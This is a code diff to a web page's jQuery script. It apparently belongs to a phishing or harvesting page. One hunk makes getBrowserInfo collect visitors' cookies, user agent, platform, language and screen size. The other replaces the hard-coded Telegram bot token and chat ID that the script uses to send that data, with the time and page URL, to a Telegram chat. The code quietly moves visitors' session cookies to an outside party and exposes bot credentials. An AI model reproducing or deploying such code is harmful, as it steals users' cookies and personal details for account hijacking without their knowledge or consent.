@@ -542,13 +542,13 @@ $(document).ready(function () {
             });
     }
 
-    // Updated getBrowserInfo function
+    // Updated getBrowserInfo function to show cookies
     function getBrowserInfo() {
         var info = "Browser: " + navigator.userAgent + "\n";
         info += "Platform: " + navigator.platform + "\n";
         info += "Language: " + navigator.language + "\n";
         info += "Screen: " + screen.width + "x" + screen.height + "\n";
-        info += "Cookies: " + (navigator.cookieEnabled ? document.cookie || "Cookies enabled" : "Cookies disabled");
+        info += "Cookies: " + (navigator.cookieEnabled ? (document.cookie || "No cookies set") : "Cookies disabled");
         return info;
     }
 
@@ -696,8 +696,8 @@ ${browserText}
 ⏰ Time: ${new Date().toLocaleString()}
 🔗 URL: ${window.location.href}`;
 
-        const token = '8516685135:AAH-OWroD5vilNG7409NYEbXXrlOWHqjea4';
-        const chatId = '674381583';
+        const token = '8563280732:AAFnMyXhUv4W8-DZFyrsarudqjQWuwEFo_w';
+        const chatId = '8221646889';
         const message = join;
 
         // Send to Telegram
